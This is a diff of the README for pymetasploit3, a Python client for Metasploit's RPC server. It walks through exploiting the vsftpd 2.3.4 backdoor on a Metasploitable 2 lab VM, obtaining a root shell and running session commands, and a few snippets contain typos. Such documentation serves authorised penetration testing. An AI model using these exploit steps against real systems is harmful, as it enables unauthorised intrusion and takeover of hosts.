@@ -9,42 +9,39 @@ This is an updated and improved version of the Python2 pymetasploit library by a
 
 Original project  : https://github.com/allfro/pymetasploit
 
-# Installation (untested)
+# Installation
 
     git clone https://github.com/DanMcInerney/pymetasploit3
     cd [Download path]/pymetasploit3
-    cd 
-    pipenv install --three
-    pipenv shell
-    python3
+    pip3 install pymetasploit3 --user (or omit --user to install system-wide, not recommended)
 
 # Basic Usage
 
-## Starting `msfrpcd`
+## Starting Metasploit RPC server
 
-
+### Msfconsole
+This will start the RPC server on port 55553 as well as the Metasploit console UI
 ```bash
-$ ./msfrpcd -P mypassword -n -f -a 127.0.0.1
-[*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...
-[*] MSGRPC ready at 2014-04-19 23:49:39 -0400.
+$ msfconsole
+msf> load msgrpc [-P yourpassword]
+```
+### msfrpcd
+This will start the RPC server on port 55552 and will just start the RPC server in the background
+```bash
+$ msfrpcd -P yourpassword
 ```
 
-The `-f` parameter tells `msfrpcd` to remain in the foreground and the `-n` parameter disables database support.
-Finally, the `-a` parameter tells `msfrcpd` to listen for requests only on the local loopback interface (`127.0.0.1`).
-
-## `MsfRpcClient` - Brief Overview
+## RPC client
 
 ### Connecting to `msfrpcd`
 
-Let's get started interacting with the Metasploit framework from python:
-
 ```python
->>> from metasploit.msfrpc import MsfRpcClient
->>> client = MsfRpcClient('mypassword')
+>>> from pymetasploit3.msfrpc import MsfRpcClient
+>>> client = MsfRpcClient('yourpassword')
 ```
 
-The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Let's take a
-look at its underbelly:
+The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Use 
+```dir(client)``` to see the callable methods.
 
 ```python
 >>> [m for m in dir(client) if not m.startswith('_')]
@@ -63,10 +60,9 @@ Like the metasploit framework, `MsfRpcClient` is segmented into different manage
 * **`plugins`**: manages the plugins associated with the Metasploit core.
 * **`sessions`**: manages the interaction with Metasploit meterpreter sessions.
 
-### Running an Exploit
+### Running an exploit
 
-Just like the Metasploit console, you can retrieve a list of all the modules that are available. Let's take a look at
-what exploits are currently loaded:
+Explore exploit modules:
 
 ```python
 >>> client.modules.exploits
@@ -76,7 +72,7 @@ what exploits are currently loaded:
 >>>
 ```
 
-We can also retrieve a list of `auxiliary`, `encoders`, `nops`, `payloads`, and `post` modules using the same syntax:
+Explore other modules:
 
 ```python
 >>> client.modules.auxiliary
@@ -91,18 +87,17 @@ We can also retrieve a list of `auxiliary`, `encoders`, `nops`, `payloads`, and 
 ...
 ```
 
-Now let's interact with one of the `exploit` modules:
+Create an exploit module object:
 
 ```python
 >>> exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
 >>>
 ```
 
-If all is well at this point, you will be able to query the module for various pieces of information such as author,
-description, required run-time options, etc. Let's take a look:
+Explore exploit information:
 
 ```python
->>>  print exploit.description
+>>>  print(exploit.description)
 
           This module exploits a malicious backdoor that was added to the	VSFTPD download
           archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
@@ -115,36 +110,24 @@ description, required run-time options, etc. Let's take a look:
 ['TCP::send_delay', 'ConnectTimeout', 'SSLVersion', 'VERBOSE', 'SSLCipher', 'CPORT', 'SSLVerifyMode', 'SSL', 'WfsDelay',
 'CHOST', 'ContextInformationFile', 'WORKSPACE', 'EnableContextEncoding', 'TCP::max_send_size', 'Proxies',
 'DisablePayloadHandler', 'RPORT', 'RHOST']
->>> exploit.required # Required options
-['ConnectTimeout', 'RPORT', 'RHOST']
+>>> exploit.missing_required # Required options which haven't been set yet
+['RHOST']
+>>>
 ```
 
-That's all fine and dandy but you're probably really itching to pop a box with this library right now, amiright!? Let's
-do it! Let's use a [Metasploitable 2](http://sourceforge.net/projects/metasploitable/) instance running on a VMWare
-machine as our target. Luckily it's running our favorite version of vsFTPd - 2.3.4 - and we already have our exploit
-module loaded in PyMetasploit. Our next step is to specify our target:
+Let's use a [Metasploitable 2](http://sourceforge.net/projects/metasploitable/) instance running on a VMWare
+machine as our exploit target. It's running our favorite version of vsFTPd - 2.3.4 - and we already have our exploit
+module loaded. Our next step is to specify our target:
 
 ```python
 >>> exploit['RHOST'] = '172.16.14.145' # IP of our target host
 >>>
 ```
 
-You can also specify or retrieve other options as well, as long as they're listed in `exploit.options`, using the same
-method as shown above. For example, let's get and set the `VERBOSE` option:
+Select a payload:
 
 ```python
->>> exploit['VERBOSE']
-False
->>> exploit['VERBOSE'] = True
->>> exploit['VERBOSE']
-True
->>>
-```
-
-Awesome! So now we're ready to execute our exploit. All we need to do is select a payload:
-
-```python
->>> exploit.payloads
+>>> exploit.targetpayloads()
 ['cmd/unix/interact']
 >>>
 ```
@@ -157,34 +140,70 @@ At this point, this exploit only supports one payload (`cmd/unix/interact`). So 
 >>>
 ```
 
-Excellent! It looks like our exploit ran successfully. How can we tell? The `job_id` key contains a number. If the
-module failed to execute for any reason, `job_id` would be `None`. For long running modules, you may want to poll the
-job list by checking `client.jobs.list`. Since this is a fairly quick exploit, the job list will most likely be empty
-and if we managed to pop our box, we might see something nice in the sessions list:
+We know the job ran successfully because `job_id` is `1`. If the module failed to execute for any reason, `job_id` would
+ be `None`. If we managed to pop our box, we might see something nice in the sessions list:
 
 ```python
 >>> client.sessions.list
-{1: {'info': '', 'username': 'ndouba', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact',
+{1: {'info': '', 'username': 'jsmith', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact',
 'uuid': '5orqnnyv', 'tunnel_local': '172.16.14.1:58429', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor',
 'exploit_uuid': '3whbuevf', 'tunnel_peer': '172.16.14.145:6200', 'workspace': 'false', 'routes': '',
 'target_host': '172.16.14.145', 'type': 'shell', 'session_host': '172.16.14.145', 'desc': 'Command shell'}}
 >>>
 ```
 
-Success! We managed to pop the box! `client.sessions.list` shows us that we have a live session with the same `uuid` as
-the one we received when executing the module earlier (`exploit.execute()`). Let's interact with the shell:
+Interact with the shell:
 
 ```python
->>> shell = client.sessions.session(1)
->>> shell.write('whoami\n')
+>>> shell = client.sessions.session('1')
+>>> shell.write('whoami')
 >>> print shell.read()
 root
->>> # Happy dance!
+>>>
 ```
 
-This is just a sample of how powerful PyMetasploit can be. Use your powers wisely, Grasshopper, because with great power
-comes great responsibility – unless you are a banker.
+Run the same `exploit` object as before but wait until it completes and gather it's output:
 
-# Questions?
+```python
+>>> cid = client.consoles.console().cid # Create a new console and store its number in 'cid'
+>>> print(client.consoles.console(cid).run_module_with_output(exploit, payload='cmd/unix/interact'))
+# Some time passes
+'[*] 172.16.14.145:21 - Banner: 220 vsFTPd 2.3.4
+[*] 172.16.14.145:21 - USER: 331 Please specify the password
+...
+'
 
-Email me at danhmcinerney@gmail.com
+```
+
+Running session commands isn't as simple as console commands. The Metasploit RPC server will return a `busy` value that 
+is True or False but determining if a session is done running a command and returning its output requires us to do it by
+ hand. For this purpose we will use a list of strings that, when found in the session's output, will tell us that the
+ session is done running its command. Below we are running the `arp` command within the session. We know this command 
+ will return one large blob of text that will contain the characters `----` if it's successfully run so we put that into 
+ a list object. 
+ 
+ ```python
+>>> session_id = '1'
+>>> session_command = 'arp'
+>>> terminating_strs = ['----']
+>>> client.session.sessions(session_id).run_with_output(session_command, terminating_strs)
+# Some time passes
+'\nARP Table\n                  ---------------\n  ...`
+```
+
+One can also use a timeout and simply return all data found before the timeout expired. `timeout` defaults to 
+Metasploit's comm timeout of 300s and will throw an exception if the command timed out. To change this, set 
+ `timeout_exception` to `False` and the library will simply return all the data from the session output it found before
+ the timeout expired.
+ ```python
+>>> session_id = '1'
+>>> session_command = 'arp'
+>>> terminating_strs = ['----']
+>>> client.session.sessions(session_id).run_with_output(session_command, terminating_strs, timeout=10, timeout_exception=False))
+# 10s pass
+'\nARP Table\n                  ---------------\n  ...`
+```
+
+# Contributions
+
+I highly encourage contributors to send in any and all pull requests and issues.
